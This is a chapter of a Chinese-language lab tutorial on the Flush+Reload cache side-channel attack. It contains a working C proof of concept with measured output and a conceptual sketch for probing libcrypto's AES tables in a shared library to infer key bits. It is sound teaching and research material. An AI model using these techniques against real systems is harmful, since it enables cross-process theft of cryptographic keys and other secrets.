# Ch 6 — Flush+Reload

> **目標**：從零刻出第一個真正可用的 cache 側信道原語。F+R 是整個微架構攻擊家族最精準、最乾淨、最容易理解的起點——同時也是 Spectre PoC 裡最常用的洩漏通道。讀完這章，你手上有一支能在這台機器上把「victim 存取哪條 cache line」100% 識別出來的程式。

> **環境**：WSL2 Ubuntu 22.04，Intel i7-10700（Comet Lake），`~/microarch_lab`。HIT~24 cycles、MISS~200–330 cycles、門檻 150。共用 harness：`timed_access()` + `_mm_clflush()` + `taskset -c 2`。

---

## 直覺：一把可以重設的碼表，加一個偷窺窗口

想像 cache 是一個「公用書架」，你（攻擊者）和 victim 共用同一個書架。

```
         書架（LLC / L3 cache）
         ┌─────────────────────────────────────┐
         │  slot 0  │ slot 1  │ ... │ slot N  │
         └─────────────────────────────────────┘
                         ↑
                  兩個人共用這個書架

攻擊者動作序列：

  1. FLUSH   ─ 把目標書（cache line）從書架上抽走，扔掉
                讓書架上那個位置空掉

  2. 等一下  ─ victim 如果需要那本書，會把它從 DRAM 重新放回書架

  3. RELOAD  ─ 攻擊者假裝「自己」也需要那本書，去書架找
               ・找到（hit, ~24 cycles）   → victim 放過那本書
               ・找不到（miss, ~244 cycles）→ victim 沒碰那本書
```

整個攻擊只有三步：**Flush → (等 victim) → Reload + 計時**。它的威力在於「計時」這把尺可以把「victim 有沒有存取這個位置」這個布林值讀出來，準確率接近 100%——前提是兩個人共用同一塊物理記憶體。

「共用記憶體」聽起來嚴苛，但現實中非常容易滿足：**動態連結函式庫（libc、libssl、libgcc）在同一台機器上跑的所有 process 都 mmap 同一個 inode 的 physical pages**。攻擊者 mmap `/lib/x86_64-linux-gnu/libcrypto.so`，victim 正在用它——物理頁完全重疊，cache 狀態也共用。

---

## 底層機制：clflush、LLC 與 Inclusive Cache

### clflush 做了什麼

`clflush` 是 x86 的一條指令：

```
CLFLUSH m8  ; 把包含 m8 位址的 cache line 從所有 cache 層級驅逐出去
```

三個關鍵性質：

**1. 清所有層級**：clflush 不只清 L1，它清 L1 + L2 + L3（在 inclusive LLC 的架構上）。i7-10700 的 L3 是 inclusive（`cpuid -1` 確認 `inclusive to lower caches = true`），所以一次 clflush 保證整條 line 從 CPU 完全消失，下次存取必然從 DRAM 回填。

**2. 需要 mfence**：clflush 之後必須加 `_mm_mfence()` 才能保證驅逐在 reload 之前完成。clflush 本身不是 full fence，亂序執行可能讓 reload 超前到 clflush 完成之前。

**3. 不需要特殊權限**：x86 允許 user-space 用 clflush 清掉自己映射的任何 cache line。這讓 F+R 在 unprivileged 攻擊者手上完全可行。

### 為什麼需要共享記憶體

F+R 的根本假設：攻擊者的 VA 和 victim 的 VA 必須對應到**同一個 physical page**。

```
攻擊者 VA: 0x7f000000  ─┐
                         ├─► PA: 0x1a2b000  (同一個 physical page)
victim   VA: 0x7fc00000  ─┘

攻擊者 clflush(0x7f000000) → 清掉 PA:0x1a2b000 對應的 cache line
victim  存取 0x7fc00000   → 從 DRAM 把 PA:0x1a2b000 帶回 LLC
攻擊者 reload(0x7f000000) → 命中 LLC (hit) → 知道 victim 碰了
```

如果兩個 VA 不對應同一個 PA，clflush 和 victim 的存取完全沒有交集，計時沒有意義。

共享記憶體的三個常見來源：
- **共享動態函式庫**：最常見。libc、libssl 等 read-only 共用 physical pages。
- **明確 mmap 同一個檔案**（兩個 process 都 `mmap("same_file", MAP_SHARED)`）
- **父子行程 fork 後 COW 頁面**（在 write 觸發 COW 之前共享）

### Cache Set 與 Way：為什麼 clflush 精準

LLC 是 set-associative——每條 cache line 根據 physical address 被索引到特定的 set，set 裡有 16 個 way（i7-10700）。clflush 清的是「那條特定的 line」，不會動到同一個 set 的其他 way。這讓 F+R 有精確到 **64-byte 粒度**的分辨能力——你能分辨 victim 存取了陣列的哪一條 cache line，不只是哪個 page。

---

## 實作：完整 Flush+Reload PoC

### 設計決策

我們建一個 `probe` 陣列，有 16 個「槽位」，每個槽位之間用 **page stride（4096 bytes）** 隔開：

```
slot 0: probe[0  * 4096]   (page 0)
slot 1: probe[1  * 4096]   (page 1)
...
slot 15: probe[15 * 4096]  (page 15)
```

**為什麼要 page stride 而不是 64B**：stride=64B 時，L1 prefetcher 的 spatial prefetcher（相鄰 cache line fetcher）和 L2 的 stride detector 會把整個 1KB 陣列幾乎全部拉進快取——無論 victim 有沒有碰，相鄰 slot 都會是 hit。Page stride（4096B）讓 prefetcher 的 stream detector 無法預測，因為 4096B 跨過了 L1 prefetcher 的 spatial domain。

victim 的行為模型：依一個 secret 值（0–15）決定存取哪個 slot：

```c
static void victim(int secret) {
    (void)probe[secret * STRIDE];
}
```

攻擊者：Flush 所有 slot → 讓 victim 跑 → Reload 每個 slot 計時 → hit 最多的那個就是 secret。

### 完整程式碼

```c
/* fr_demo.c — Flush+Reload: 還原 victim 的 secret (Ch 6) */
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <x86intrin.h>
#include <sys/mman.h>

#define CACHE_HIT_THRESHOLD 150
#define STRIDE  4096       /* page stride: 讓 prefetcher 失效 */
#define NLINES  16         /* 探測 16 個槽位 */
#define SAMPLES 500        /* 重複 500 次取多數 */

static volatile char probe[NLINES * STRIDE] __attribute__((aligned(4096)));

static inline uint64_t timed_access(volatile char *p) {
    unsigned junk;
    _mm_lfence();
    uint64_t a = __rdtscp(&junk);
    (void)*p;
    uint64_t b = __rdtscp(&junk);
    _mm_lfence();
    return b - a;
}

static void victim(int secret) {
    (void)probe[secret * STRIDE];
}

static int attack(int secret) {
    uint64_t hit_count[NLINES] = {0};
    uint64_t sum_time[NLINES]  = {0};

    for (int s = 0; s < SAMPLES; s++) {
        /* Step 1: Flush 所有探測 line */
        for (int i = 0; i < NLINES; i++)
            _mm_clflush((void*)&probe[i * STRIDE]);
        _mm_mfence();

        /* Step 2: Victim 存取 */
        victim(secret);
        _mm_mfence();

        /* Step 3: Reload 並計時 */
        for (int i = 0; i < NLINES; i++) {
            uint64_t t = timed_access(&probe[i * STRIDE]);
            sum_time[i] += t;
            if (t < CACHE_HIT_THRESHOLD) hit_count[i]++;
        }
    }

    int best = 0;
    for (int i = 1; i < NLINES; i++)
        if (hit_count[i] > hit_count[best]) best = i;

    printf("line | avg_cyc | hits/%d\n", SAMPLES);
    printf("-----|---------|-------\n");
    for (int i = 0; i < NLINES; i++) {
        printf("  %2d | %7.1f | %5lu  %s\n",
               i, (double)sum_time[i]/SAMPLES, hit_count[i],
               (i == secret) ? "<-- victim accessed" :
               (i == best && best != secret) ? "<-- wrongly predicted" : "");
    }
    printf("Predicted=%d actual=%d -> %s\n\n",
           best, secret, best==secret ? "CORRECT" : "WRONG");
    return best == secret;
}

int main(void) {
    /* 初始化並全部 flush，確保 probe array 不在快取裡 */
    memset((void*)probe, 1, sizeof(probe));
    for (int i = 0; i < NLINES; i++)
        _mm_clflush((void*)&probe[i * STRIDE]);
    _mm_mfence();

    printf("=== Flush+Reload Demo (Ch 6) ===\n");
    printf("STRIDE=%d  THRESHOLD=%d  SAMPLES=%d\n\n",
           STRIDE, CACHE_HIT_THRESHOLD, SAMPLES);

    int correct=0, total=8;
    int secrets[] = {0,3,7,12,15,1,9,5};
    for (int i=0; i<total; i++) {
        printf("--- Trial %d  secret=%d ---\n", i+1, secrets[i]);
        correct += attack(secrets[i]);
    }
    printf("=== %d/%d correct ===\n", correct, total);
    return 0;
}
```

**編譯與執行**：

```bash
cd ~/microarch_lab
gcc -O0 fr_demo.c -o fr_demo
taskset -c 2 ./fr_demo
```

### 真實輸出（i7-10700, WSL2, 本機實測）

```
=== Flush+Reload Demo (Ch 6) ===
STRIDE=4096  THRESHOLD=150  SAMPLES=500

--- Trial 1  secret=0 ---
line | avg_cyc | hits/500
-----|---------|-------
   0 |    23.5 |   500  <-- victim accessed
   1 |   322.7 |     0
   2 |   273.4 |     0
   3 |   280.2 |     0
   4 |   221.0 |     0
   5 |   239.4 |     0
   6 |   268.8 |     0
   7 |   271.4 |     0
   8 |   258.4 |     0
   9 |   277.3 |     0
  10 |   273.5 |     0
  11 |   330.3 |     0
  12 |   246.4 |     0
  13 |   291.8 |     0
  14 |   249.3 |     0
  15 |   250.6 |     0
Predicted=0 actual=0 -> CORRECT

--- Trial 2  secret=3 ---
line | avg_cyc | hits/500
-----|---------|-------
   0 |   305.7 |     0
   1 |   338.8 |     0
   2 |   287.2 |     0
   3 |    23.6 |   500  <-- victim accessed
   4 |   271.8 |     1
   5 |   248.9 |     0
   6 |   306.4 |     0
   7 |   348.8 |     0
   8 |   307.1 |     0
   9 |   303.3 |     0
  10 |   291.1 |     1
  11 |   287.6 |     0
  12 |   273.7 |     1
  13 |   311.0 |     0
  14 |   327.2 |     0
  15 |   287.8 |     1
Predicted=3 actual=3 -> CORRECT

--- Trial 3  secret=7 ---
   7 |    24.0 |   500  <-- victim accessed
   （其餘 0–6, 8–15 皆 miss，0/500）
Predicted=7 actual=7 -> CORRECT

（Trial 4 secret=12, Trial 5 secret=15, Trial 6 secret=1,
  Trial 7 secret=9, Trial 8 secret=5 — 全部 CORRECT）

=== 8/8 correct ===
```

訊號乾淨到無需解讀：**正確槽位 500/500 hit（23–24 cycles），其餘 0–1/500 hit（220–390 cycles）**。兩堆之間的鴻溝超過 10×，門檻 150 只是保守的容錯。

---

## 範例 2：邊界情況——stride 太小時 prefetcher 汙染

把 STRIDE 從 4096 改成 64（相鄰 cache line），觀察 prefetcher 的影響。在這台機器上跑 Trial 1（secret=0）：

```
--- Trial 1 (secret=0, STRIDE=64) ---
line | avg_cyc | hits/500
-----|---------|-------
   0 |    24.6 |  1000  <-- predicted secret
   1 |    49.1 |   999       ← prefetcher 把 slot 1 也拉進來了
   2 |    24.0 |  1000
   3 |    73.9 |   777
   4 |    24.1 |  1000
   5 |    24.4 |   999
   ...（幾乎全部是 hit）
Predicted=0 actual=0 -> CORRECT （碰巧對，但信噪比很低）
```

問題：stride=64 時，slot 0、2、4、6... 全部是 24 cycles（hit）——prefetcher 的 stride detector 識別了你的循序存取，把半個陣列都預熱了。你根本分不出哪個是 victim 碰的、哪個是 prefetcher 拉的。當 secret=3 時，hit 最多的槽位和 secret 0 一樣，PoC 直接失敗。

**Page stride（4096B）是讓 prefetcher 失效的最小安全 stride**。相鄰兩個 slot 差一個 page，prefetcher 的 stream detector 和 spatial prefetcher 都無法預測下一個存取位置。

---

## 範例 3：真實跨 process F+R 的設計模式

前面的 demo 用同一個 process 模擬 victim 和 attacker。真實 F+R 的常見設計：

```c
/* attacker.c（概念性描述，非完整程式） */

/* 1. mmap 同一個 shared library（跟 victim 共用 physical pages） */
int fd = open("/usr/lib/x86_64-linux-gnu/libcrypto.so.3", O_RDONLY);
struct stat st; fstat(fd, &st);
char *probe = mmap(NULL, st.st_size, PROT_READ, MAP_SHARED, fd, 0);

/* 2. 計算 victim 可能存取的 offset（例如 AES S-box 在 .rodata 裡的偏移） */
/* 通常用 objdump -t libcrypto.so | grep AES_Td 找 symbol offset */
size_t aes_td_offset = /* 從 symbol table 讀到的 offset */;

/* 3. 攻擊迴圈 */
for (int byte_guess = 0; byte_guess < 256; byte_guess++) {
    /* 探測陣列：byte_guess -> 對應 AES lookup table 的哪個 entry */
    volatile char *target = probe + aes_td_offset + byte_guess * 64;
    _mm_clflush((void*)target);          /* Flush */
    _mm_mfence();

    /* ... 等 victim 做一個 AES round ... */

    uint64_t t = timed_access(target);   /* Reload */
    if (t < 150) {
        /* victim 用到了 byte_guess 對應的 AES table entry */
        /* 推斷 plaintext XOR key 的某些 bits */
    }
}
```

關鍵：`libcrypto.so` 是 read-only 的 shared mapping——kernel 保證所有 process mmap 同一個 inode 的 read-only 區域都共用同一批 physical pages。你不需要和 victim 有任何 IPC，物理記憶體本身就是共用通道。這正是 Yarom & Falkner 的原始論文攻擊 GnuPG RSA 的做法（Ch 11 深入）。

---

## 對比與取捨

| 維度 | Flush+Reload | 備注 |
|------|-------------|------|
| **精度** | 64 bytes（cache line 粒度） | 最高，能分辨陣列的具體 entry |
| **準確率** | >99%（本機 8/8 = 100%） | 訊號極乾淨，一次採樣通常夠 |
| **需要共享記憶體** | 是，VA→PA 必須重疊 | 最大限制；shared library 常常自動滿足 |
| **需要 clflush** | 是 | user-space 可用；某些 VM/沙箱可能封鎖 |
| **雜訊** | 極低 | prefetcher 是主要干擾源；page stride 可壓制 |
| **頻寬（covert channel）** | 中等 | 每條 line 一個 bit；多 line 多 bit（Ch 7） |
| **vs Evict+Reload** | 更快、更精準 | E+R 不需 clflush 但需要 eviction set |
| **vs Prime+Probe** | 更乾淨 | P+P 不需共享記憶體，但精度和雜訊差（Ch 8） |
| **vs Flush+Flush** | 較慢 | F+F 不存取目標，計時 flush 本身（Ch 10） |

---

## 踩雷集錦

**1. stride 沒用 page size → prefetcher 汙染，每條 line 都是 hit**

錯誤直覺：「我只需要 `NLINES * LINE_SIZE = 16 * 64 = 1024` bytes 的陣列就夠了。」
正確認識：stride=64B 時，L1 spatial prefetcher（相鄰 cache line）和 L2 stride detector 會把整個 1KB 陣列幾乎全部拉進快取，無論 victim 存取了哪個 slot。Page stride（4096B）讓連續兩個 slot 永遠不在同一個 prefetcher pattern 上。

**2. clflush 後沒加 mfence → reload 和 flush 亂序，量到 victim 之前的狀態**

錯誤直覺：「clflush 是個 fence 指令吧？自己會序列化。」
正確認識：clflush 本身**不是** full fence（Intel SDM 明確記載）。在亂序執行下，後面的 load 可能在 clflush 完成之前就被發射出去，結果你 reload 到的是 flush 之前的 cached 版本，每次都是 hit，攻擊永遠「成功」但讀出的全是假象。**flush 後加 `_mm_mfence()`**。

**3. victim 和 attacker 不共用 physical page → clflush 完全無效**

錯誤直覺：「victim 和 attacker 都宣告了 `static char buf[1024]`，應該共用記憶體。」
正確認識：`static` 陣列是各自 process 的 private mapping，各有各的 PA，clflush 對方的 VA 根本不相關。共享必須通過 `MAP_SHARED` mmap 同一個檔案，或明確的 shared memory（shm_open/mmap MAP_SHARED）。**沒有明確共享，F+R 的第一步就不成立。**

**4. 忘記 `volatile` → 編譯器把 probe 存取優化掉，量到 0 cycles**

錯誤直覺：「我 `#define volatile` 什麼的，程式碼那麼簡單應該沒問題。」
正確認識：`-O2` 以上，編譯器看到 `(void)*p;` 的結果沒被用到，直接刪掉整個存取。`timed_access` 裡的指標必須是 `volatile char *`，且整個 probe array 也要宣告 `volatile`，否則 `victim()` 裡的存取也可能被優化掉。

**5. 所有 shared library 的 page 都一定在同一個 cache set → 錯誤地把 F+R 和 P+P 的前提混淆**

錯誤直覺：「既然 F+R 能打 libc，那一定有什麼方式可以不需要共享記憶體。」
正確認識：F+R **就是**靠共享記憶體，它是這個原語的必要條件。不需要共享記憶體的是 Prime+Probe——它不 clflush 目標，而是把整個 cache set 填滿、再看哪個 way 被踢掉。根本上不同的原語（Ch 8）。

---

## 進階：再往深一層

### Inclusive vs Non-inclusive LLC 的影響

i7-10700 的 LLC 是 **inclusive**（cpuid 確認 `inclusive to lower caches = true`）。Inclusive 表示 L3 裡有的 line，L1/L2 裡一定也有。clflush 清 L3 時，inclusive 保證 L1/L2 的同一條 line 也被 invalidate——這讓 clflush 能精準清掉所有快取層級，不留殘影。

新一代 Intel（Skylake Xeon、Ice Lake Server）和 AMD 使用 **non-inclusive LLC**（NINE）。在這種架構上，clflush 理論上清的是 L3，但 L1/L2 的 copy 可能還留著——victim 的後續存取會命中 L2（~40 cycles）而非 DRAM（~200 cycles），你的 reload 看到「中間時間值」，門檻選取和訊號解讀都更複雜。實務上 clflush 仍能工作，但需要重新校準門檻。

### clflushopt：批次 flush 的更快版本

Intel Broadwell+ 加了 `clflushopt`（optimal flush），語意和 clflush 相同但吞吐更高——`clflush` 是 serializing 的，`clflushopt` 只有 order 保證，多個 clflushopt 可以 pipeline。在需要批次 flush 大量 line（如 F+R 掃 AES S-box 的 256 個 entry）時，clflushopt 明顯更快。使用方式：`-mclflushopt` 編譯旗標 + `_mm_clflushopt()`，後面還是要 `mfence`。

### Spectre 的洩漏通道就是 F+R

Spectre-v1 的標準 PoC 裡，「受害者」是**推測執行的程式碼**——CPU 推測執行了一個越界存取，把秘密 byte 的值用來索引 `probe_array`（`probe_array[secret_byte * 4096]`）。雖然推測執行的記憶體狀態會被 rollback，但 **cache 狀態不會**——那條 line 留在 LLC。攻擊者用 F+R 掃 probe_array，命中的 slot index 就是 `secret_byte` 的值。你在這一章做的事，和 Spectre PoC 的最後一步完全相同——差別只在「誰把那條 line 放進 LLC 的」。這是 Ch 13–14 的直接前導。

---

## 動手練習

1. **stride 敏感度實驗**：把 `STRIDE` 從 4096 改到 64、128、512、1024，各跑一次，記錄每個設定下「非 victim slot 的平均 hit_count」。在哪個 stride 開始出現 false positive？畫出 STRIDE vs 雜訊的關係。

2. **加入亂序 reload**：修改 `attack()` 函式，用 Fisher-Yates shuffle 隨機化每次 reload 的槽位順序。確認結果不變（正確率保持 100%），再觀察隨機化前後的平均計時分佈是否有差異。

3. **真實兩 process 版本**：用 `MAP_SHARED` mmap 同一個檔案；parent 做 attacker（flush+reload），child 做 victim（按 secret 存取對應 slot）。用 `sem_t` 同步。確認兩個不同 PID 也能正確識別 secret。

4. **量 attack 的最低 sample 數**：把 SAMPLES 從 500 逐漸降到 1、5、10、50，觀察正確率在哪個值開始掉。理解「為什麼 1 次採樣對某些 secret 也夠，但對某些就不行」。

---

## 本章重點整理

- Flush+Reload 三步：**clflush 目標 line → 等 victim → 計時 reload，hit 代表 victim 存取過**。
- 需要**共享物理記憶體**（shared library、MAP_SHARED）——沒有這個前提，clflush 不影響 victim 的快取狀態。
- 必須用 **page stride（4096B）** 隔開探測槽位，讓 hardware prefetcher 無法預測下一條 line。
- `clflush` 後要 `mfence`；`timed_access` 裡用 `rdtscp` + `lfence` 確保計時序列化。
- 訊號乾淨：本機 8/8 正確、hit 23–24 cycles vs miss 220–390 cycles，鴻溝 10×。
- F+R 是 Spectre PoC 裡最常用的洩漏通道（probe_array + 4096 stride），Part 3 的地基。

---

## 自我檢核

- [ ] 能不看筆記說出「為什麼 F+R 需要共享記憶體」以及「什麼樣的場景下自動滿足這個條件」？
- [ ] 能解釋「clflush 後為什麼一定要加 mfence」以及「不加的話 PoC 會怎麼出錯」？
- [ ] 能說出「stride 為什麼要用 page size」以及「prefetcher 的哪個機制在更小 stride 下汙染量測」？
- [ ] 知道「F+R 在 inclusive vs non-inclusive LLC 下行為有什麼差異」嗎？
- [ ] 能解釋「Spectre-v1 為什麼用 F+R 作為洩漏通道」以及「probe_array 為什麼要用 4096 stride」？

---

## 延伸閱讀

- **[FLUSH+RELOAD: a High Resolution, Low Noise, L3 Cache Side-Channel Attack](https://eprint.iacr.org/2013/448.pdf)** — Yarom & Falkner, USENIX Security 2014
  - **讀哪裡**：Section 3（攻擊描述）、Section 4（門檻選取，圖 1 是你的 hit/miss 分佈的學術版）、Section 5.2（共用 library 的實驗）。
  - **學到什麼**：原始 F+R 的設計動機、跨 process 的物理記憶體共享如何成立、針對 GnuPG RSA 的實際攻擊。
  - **關聯**：本章整個 PoC 是這篇的簡化教學版；門檻選取方法完全相同。

- **[Spectre Attacks: Exploiting Speculative Execution](https://spectreattack.com/spectre.pdf)** — Kocher et al., IEEE S&P 2019
  - **讀哪裡**：Section III-A（Listing 1，victim_function 的 probe_array 就是 F+R probe array）、Section IV（F+R 作為 covert channel 的細節）。
  - **學到什麼**：F+R 如何被用作瞬態執行攻擊的讀出通道——這是 Part 3 的直接前導。

- **[Mastik: A Micro-Architectural Side-Channel Toolkit](https://cs.adelaide.edu.au/~yval/Mastik/)** — Yuval Yarom
  - **讀哪裡**：`src/FR.c`（F+R 原語的研究級實作）、`samples/FR-simple.c`（最小示範）。
  - **學到什麼**：研究用的 F+R 怎麼處理亂序 reload、bulk flush、自動門檻選取。把你的 PoC 和 Mastik 對照，找到你省略的細節。

- **[Cache-Timing Vulnerabilities in AES Implementations](https://cr.yp.to/antiforgery/cachetiming-20050414.pdf)** — Bernstein, 2005
  - **讀哪裡**：Section 2（為什麼 AES table lookup 洩漏 key）、Section 4（計時攻擊的實驗設計）。
  - **學到什麼**：F+R 的前身是純計時攻擊（不需要 clflush）；理解兩者的異同讓你更清楚 cache 攻擊的演進脈絡。

---

F+R 是最乾淨的第一刀——訊號/雜訊比高、程式碼短、原理透明。但它有一個核心限制：需要共享記憶體。下一章，我們把 F+R 從「偷看」變成「偷傳」——用 cache 狀態當成秘密通道，讓兩個 process 在沒有任何 OS IPC 的情況下傳遞資料。這是理解「cache channel 能有多強大」的關鍵一步，也是後面 Spectre 用 covert channel 傳遞推測執行洩漏資料的直接前導。

→ [Ch 7 Flush+Reload covert channel](./07-flush-reload-covert-channel.md)
